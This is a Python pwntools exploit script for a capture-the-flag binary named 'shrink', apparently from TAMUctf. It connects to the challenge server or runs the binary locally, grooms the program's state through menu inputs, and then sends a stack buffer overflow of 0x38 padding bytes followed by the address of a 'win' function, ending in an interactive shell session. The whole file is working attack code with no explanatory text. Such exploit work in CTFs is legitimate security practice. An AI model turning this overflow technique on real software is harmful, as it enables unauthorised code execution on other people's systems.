from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''
			b* 0x0000000000401391
			b* 0x0000000000401450
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./shrink")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc aze 14 "
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	#p=remote(host,port)
	p=remote("tamuctf.com", 443, ssl=True, sni="shrink")
else:
	p=process([exe.path])

############### helper functions ##############
def send():
	pass

############### main exploit    ###############
#for i in range(30):
#	p.sendline("3")

win=0x0000000000401255
#sleep(0.5)

p.sendline("2")
p.sendline(b"a"*3)
#p.sendline(b"a"*)
sleep(0.5)
p.sendline("2")
p.sendline(b"a"*16+b"b")
sleep(0.5)
p.sendline("2")
p.sendline(b"a"*3)
sleep(0.5)

#debug()

sleep(0.5)
p.sendline("2")
p.sendline(b"a"*0x38+p64(win))
sleep(0.5)

p.sendline("4")

'''
p.sendline("2")
p.sendline(b"a"*0x38+p64(win))
'''
#p.sendline(b"a"*0x38+p64(win))

'''
p.sendline("2")
p.sendline()
'''






p.interactive()